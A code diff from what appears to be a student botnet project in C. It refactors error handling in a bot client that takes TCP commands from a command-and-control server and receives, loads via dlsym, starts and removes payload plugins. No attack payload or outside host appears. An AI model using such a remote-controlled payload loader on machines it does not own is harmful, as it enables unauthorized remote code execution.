@@ -12,14 +12,13 @@
 #include <unistd.h>
 #include <dlfcn.h>
 
-
 #include <libthrd.h>
 #include <libnetwork.h>
 #include <liblistes.h>
 #include "bot.h"
 
 extern liste_cu_t list_CU;
-
+extern info_bot_t *bot;
 /**
  * void send_status(info_bot_t info, int socket_tcp)
  * Fonction qui envoie le statut du bot au CC sur la socket TCP
@@ -31,11 +30,10 @@ void send_status(int socket_tcp)
     printf("[send_status]Start\n");
     char status;
     //strcpy(&status,&(bot->etat));
-    printf(" Le status que j'ai récup est : %c\n",status);
+    printf(" Le status que j'ai récup est : %c\n", status);
     if (write(socket_tcp, &status, sizeof(char)) < 0)
     {
         //traitement de l'erreur
-
     }
 }
 /**
@@ -46,13 +44,19 @@ void send_status(int socket_tcp)
 void start_charge(char *filename)
 {
     printf("[start_charge]Start\n");
-    strcpy(&(bot->etat),BOT_ACTIF);
+    bot->etat = BOT_ACTIF;
     // chercher dans la liste le nom de la structure
     //TO DO : cas ou la charge n'est pas dans la liste => erreur
-    charge_utile_t *structure = rechercheCU(filename, &list_CU);
+    charge_utile_t *structure;
+    if (rechercheCU(filename, &list_CU, &structure) != 0)
+    {
+        perror("Une erreur a eu lieu lors de la recherche de la charge utile\n");
+        return;
+    }
     // TO DO : vérifier que la charge n'a pas déjà été start (qu'elle tourne pas déjà )
     printf("Je vais start le fichier : %s \n", structure->nom);
     init_f start;
+    //https://stackoverflow.com/questions/14134245/iso-c-void-and-function-pointers
     *(void **)(&start) = dlsym(structure->plugin, "start");
     char *result = dlerror();
     if (result)
@@ -64,7 +68,7 @@ void start_charge(char *filename)
     //TO DO : remplir la variable executed et resultat
     printf("Lancement du thread sur la fonction chargée\n");
     start(NULL);
-    strcpy(&(bot->etat),BOT_INACTIF);
+    bot->etat = BOT_INACTIF;
 }
 
 /**
@@ -76,10 +80,16 @@ void start_charge(char *filename)
 void install_charge(char *file_name)
 {
     printf("[install_charge]Start\n");
-    // On met le statut du bot à 1 
-    strcpy(&(bot->etat),BOT_ACTIF);
+    // On met le statut du bot à 1
+    bot->etat = BOT_ACTIF;
     //chercher dans la liste la structure portant ce nom
-    charge_utile_t *charge = rechercheCU(file_name, &list_CU);
+    charge_utile_t *charge;
+    if (rechercheCU(file_name, &list_CU, &charge) != 0)
+    {
+        perror("Une erreur a eu lieu lors de la recherche de la charge utile\n");
+        return;
+    }
+
     if (charge == NULL)
     {
         printf("Did not find the charge installed\n");
@@ -101,8 +111,8 @@ void install_charge(char *file_name)
             return;
         }
         print_listeCU(list_CU);
-        //On met le statut du bot à 0 
-        strcpy(&(bot->etat),BOT_INACTIF);
+        //On met le statut du bot à 0
+        bot->etat = BOT_INACTIF;
     }
     else
     {
@@ -114,7 +124,12 @@ void install_charge(char *file_name)
 void rm_charge(char *filename)
 {
     printf("[rm_charge]Start\n");
-    charge_utile_t *structure = rechercheCU(filename, &list_CU);
+    charge_utile_t *structure;
+    if (rechercheCU(filename, &list_CU, &structure) != 0)
+    {
+        perror("Une erreur a eu lieu lors de la recherche de la charge utile\n");
+        return;
+    }
     if (structure == NULL)
     {
         printf("je vais supprimer le fichier : %s\n", filename);
@@ -128,29 +143,37 @@ void rm_charge(char *filename)
     }
     printf("La charge utile %s a bien été supprimée ! \n", filename);
     // TO DO : Répondre au cc
-    
 }
 
-charge_utile_t *getChargeFromMessage(int socket)
+int getChargeFromMessage(int socket, charge_utile_t **returned_charge)
 {
     printf("[getChargeFromMessage]Start\n");
     char filename[TAILLE_FILENAME];
     if (receiveTCP(socket, filename, TAILLE_FILENAME) < 0)
     {
         printf("Erreur dans la réception du nom de la charge utile\n");
-        return NULL;
+        return 1;
     }
     printf("Le nom du fichier est : %s\n", filename);
-    charge_utile_t *charge = rechercheCU(filename, &list_CU);
+    charge_utile_t *charge;
+    if (rechercheCU(filename, &list_CU, &charge) != 0)
+    {
+        perror("Une erreur a eu lieu lors de la recherche de la charge utile\n");
+        *returned_charge = NULL;
+        return 1;
+    }
     if (charge != NULL)
     {
         print_CU_structure(charge);
+        *returned_charge = charge;
+        return 0;
     }
     else
     {
         printf("La charge utile n'existe pas");
+        *returned_charge = NULL;
+        return 0;
     }
-    return charge;
 }
 
 /** void receive_cmd_TCP(void *arg)
@@ -178,7 +201,11 @@ void receive_cmd_TCP(void *arg)
         recvFile(&socket_tcp);
         break;
     case '3': //START
-        charge = getChargeFromMessage(socket_tcp);
+        if (getChargeFromMessage(socket_tcp, &charge) != 0)
+        {
+            perror("Une erreur est survenue lors du getChargeMessage\n");
+            //renvoieErreur()
+        }
         if (charge == NULL)
         {
             perror("Can't start charge utile\n");
@@ -193,7 +220,11 @@ void receive_cmd_TCP(void *arg)
         break;
     case '4': //RM
 
-        charge = getChargeFromMessage(socket_tcp);
+        if (getChargeFromMessage(socket_tcp, &charge) != 0)
+        {
+            perror("Une erreur est survenue lors du getChargeMessage\n");
+            //renvoieErreur()
+        }
         if (charge == NULL)
         {
             perror("Can't rm charge utile\n");
